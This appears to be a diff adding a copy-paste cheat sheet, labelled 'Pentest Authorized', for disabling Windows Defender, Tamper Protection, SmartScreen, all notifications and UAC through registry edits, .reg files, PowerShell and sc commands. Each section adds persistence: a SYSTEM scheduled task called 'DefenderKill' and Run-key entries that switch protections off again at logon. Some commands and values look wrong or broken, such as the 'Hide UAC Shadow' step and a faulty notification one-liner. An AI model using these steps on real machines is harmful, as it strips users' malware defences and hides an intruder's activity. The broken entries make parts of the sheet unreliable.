@@ -1,0 +1,413 @@
+Disable Windows Security / Defender (Pentest Authorized)
+Method 1: Registry - Real-Time Protection OFF
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
+
+Create keys/values:
+"DisableAntiSpyware"=dword:00000001
+"DisableRealtimeMonitoring"=dword:00000001
+"DisableBehaviorMonitoring"=dword:00000001
+"DisableOnAccessProtection"=dword:00000001
+"DisableBlockAtFirstSeen"=dword:00000001
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
+
+"DisableRealtimeMonitoring"=dword:00000001
+"DisableBehaviorMonitoring"=dword:00000001
+"DisableOnAccessProtection"=dword:00000001
+"DisableScanOnRealtimeEnable"=dword:00000001
+
+Method 2: Services Disabled
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
+
+Start = 4 (Disabled)
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
+
+Start = 4
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense
+
+Start = 4
+Method 3: Tamper Protection Bypass
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features
+
+"TamperProtection"=dword:00000000
+"VulnerabilityScanner"=dword:00000000
+
+Method 4: Group Policy Registry
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
+
+"AllowFastServiceStartup"=dword:00000000
+"DisableAntiSpyware"=dword:00000001
+"DisableRoutinelyScanning"=dword:00000000
+
+Method 5: PowerShell One-Liner (Admin)
+powershell
+# All-in-one disable
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SubmitSamplesConsent 2 -MAPSReporting 0 -PUAProtection 0
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
+
+Method 6: Complete Kill Switch
+reg
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
+"DisableAntiSpyware"=dword:00000001
+"DisableRealtimeMonitoring"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]
+"Start"=dword:00000004
+
+Verification
+cmd
+sc query WinDefend
+Get-MpPreference | Select DisableRealtimeMonitoring
+
+Re-Enable
+Start = 2  ; Auto
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+Persistence for Pentest
+Scheduled Task (bypass reboot recovery):
+powershell
+schtasks /create /tn "DefenderKill" /tr "powershell -c 'sc config WinDefend start=disabled'" /sc onstart /ru SYSTEM /f
+
+
+
+
+Disable Windows SmartScreen (Pentest Authorized)
+Method 1: Registry - All SmartScreen Components
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System
+
+
+
+"EnableSmartScreen"=dword:00000000
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System
+
+
+
+"ShellSmartScreenLevel"="Off"
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
+
+
+
+"SmartScreenEnabled"="Off"
+Method 2: Edge/Chrome SmartScreen
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge
+
+
+
+"SmartScreenEnabled"=dword:00000000
+"SmartScreenPuaBlockEnabled"=dword:00000000
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications
+
+
+
+"NoTileApplicationNotification"=dword:00000001
+Method 3: Complete SmartScreen Kill
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter
+
+
+
+"Enabled"=dword:00000000
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System
+
+
+
+"ShellSmartScreenLevel"="Off"
+"EnableSmartScreen"=dword:00000000
+"SmartScreenLevel"="Off"
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen
+
+
+
+"ConfigureAppInstallControlEnabled"=dword:00000000
+"ConfigureAppInstallControl"=dword:00000000
+Method 4: Group Policy Registry Keys
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System
+
+
+
+"EnableSmartScreen"=dword:00000000
+"ShellSmartScreenLevel"="Off"
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter
+
+
+
+"Enabled"=dword:00000000
+
+Method 5: PowerShell Nuke
+# Disable all SmartScreen
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType DWORD -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "ShellSmartScreenLevel" -Value "Off" -PropertyType String -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
+
+Method 6: .REG File (Copy-Paste Ready)
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
+"EnableSmartScreen"=dword:00000000
+"ShellSmartScreenLevel"="Off"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer]
+"SmartScreenEnabled"="Off"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen]
+"ConfigureAppInstallControlEnabled"=dword:00000000
+
+Verification
+Download test file → No warning
+Settings → Privacy & Security → Windows Security → No SmartScreen prompts
+
+reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen
+
+Pentest Persistence
+Startup Registry:
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+"KillSmartScreen"="reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f"
+
+
+Disable ALL Windows Notifications (Complete Silence)
+Method 1: Registry - Master Kill Switch
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications
+
+
+
+"NoToastApplicationNotification"=dword:00000001
+"NoTileApplicationNotification"=dword:00000001
+"NoToastApplicationNotificationOnLockScreen"=dword:00000001
+
+
+
+HKEY_CURRENT_USER\Software\Notifications\Settings
+Delete all subkeys OR set:
+
+
+
+
+"Enabled"=dword:00000000  ; In every app subkey
+Method 2: Action/Toast Center Disabled
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings
+
+
+
+"Enabled"=dword:00000000
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
+
+
+
+"EnableXamlStartMenu"=dword:00000000
+"ShowNotificationsOnLockScreen"=dword:00000000
+Method 3: Focus Assist + Do Not Disturb PERMANENT
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings
+
+
+
+"NOC_GLOBAL_SETTING_ALLOW_TOAST_ABOVE_LOCK"=dword:00000000
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell
+
+
+
+"DisableNotificationToasts"=dword:00000001
+Method 4: Complete Notification Nuke (.REG)
+reg
+
+
+
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications]
+"NoToastApplicationNotification"=dword:00000001
+"NoTileApplicationNotification"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Notifications\Settings]
+"Enabled"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings]
+"Enabled"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
+"ShowNotificationsOnLockScreen"=dword:00000000
+Method 5: PowerShell Total Silence
+
+# Kill all notification settings
+Get-ChildItem "HKCU:\Software\Notifications\Settings" | ForEach-Object { Set-ItemProperty -Path $_.PSPath -Name "Enabled" -Value 0 }
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "NoToastApplicationNotification" -Value 1
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "Enabled" -Value 0 -Force
+
+Method 6: Services (Nuclear)
+sc config WpnService start= disabled
+sc stop WpnService
+net stop WpnUserService
+
+
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WpnService
+Start = 4
+
+Bonus: Lock Screen + Start Menu
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System
+
+
+
+"ShowLockScreenNotifications"=dword:00000000
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager
+
+
+
+"SilentToastAbility"=dword:00000000
+Verification
+Action Center empty
+No toast popups
+Settings → System → Notifications → All toggled OFF
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v NoToastApplicationNotification
+
+Pentest Stealth Mode
+Auto-run on login:
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+"NoNotifications"="powershell -c 'gc HKCU:\\Software\\Notifications\\Settings\\* | % {Set-ItemProperty -Path $_ -Name \"Enabled\" -Value 0}'"
+
+
+Disable UAC Completely (Pentest Authorized)
+Method 1: Registry - UAC OFF (Most Common)
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+
+
+"EnableLUA"=dword:00000000
+"ConsentPromptBehaviorAdmin"=dword:00000000
+"PromptOnSecureDesktop"=dword:00000000
+Method 2: Full UAC Nuke (.REG Ready)
+reg
+
+
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
+"ConsentPromptBehaviorAdmin"=dword:00000000
+"ConsentPromptBehaviorUser"=dword:00000000
+"PromptOnSecureDesktop"=dword:00000000
+"EnableVirtualization"=dword:00000000
+"EnableInstallerDetection"=dword:00000000
+Method 3: PowerShell Instant Disable
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
+
+Method 4: Services (UAC Engine)
+
+
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc
+Start = 4
+
+
+
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\luafv
+Start = 4
+
+cmd
+
+
+
+sc config ConsentUxUserSvc start= disabled
+sc config luafv start= disabled
+net stop luafv
+Method 5: Group Policy Registry
+
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+
+
+"FilterAdministratorToken"=dword:00000000
+Method 6: Visual Effects (Hide UAC Shadow)
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects
+
+
+
+"VisualFXSetting"=dword:00000002
+Verification
+cmd
+
+
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
+Result: 0x0 = DISABLED
+
+No UAC prompts
+Run as Admin = instant elevation
+whoami /groups shows Admin token
+
+Pentest Persistence
+Startup bypass:
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+"KillUAC"="reg add \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v EnableLUA /t REG_DWORD /d 0 /f"
+Immediate effect after reboot OR:
+cmd
+
+gpupdate /force
+Pro Tip: Token Duplication Test
+cmd
+
+# Verify admin token (no filter)
+whoami /priv
+# All privileges enabled without UAC split
